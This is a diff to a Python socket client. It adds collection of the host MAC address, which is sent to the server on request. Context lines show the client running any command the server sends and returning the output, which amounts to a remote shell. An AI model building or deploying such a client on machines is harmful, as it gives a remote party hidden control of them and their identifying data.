@@ -6,6 +6,12 @@ from . import commands
 from . import Communication
 from . import connection_details
 from .errors import DisconnectedFromServer, ConnectionLostFromServer
+import uuid
+
+
+def get_mac_address() -> str:
+    address = hex(uuid.getnode())
+    return ":".join([address[i: i+2] for i in range(2, len(address), 2)])
 
 
 def setup_socket() -> socket.socket:
@@ -19,7 +25,7 @@ def setup_socket() -> socket.socket:
     return sock
 
 
-def communication_signature(communication: Type[Communication]):
+def communication_signature(communication: Type[Communication]) -> bytes:
     """
     creates a byte signature from a class dict
     this signature byte signature is used to see if the server and
@@ -67,6 +73,7 @@ class Client:
         self.socket = setup_socket()
         self.loop = loop if loop else asyncio.get_event_loop()
         self.communication = communication_signature(Communication)
+        self.mac_address = get_mac_address().encode()
 
     def close(self) -> None:
         """
@@ -101,6 +108,8 @@ class Client:
             raise ConnectionLostFromServer
         elif data == Communication.disconnect:
             raise DisconnectedFromServer
+        elif data == Communication.provide_mac:
+            await self.send(self.mac_address)
         else:
             stdout = run_command(data.decode())
             await self.send(stdout)
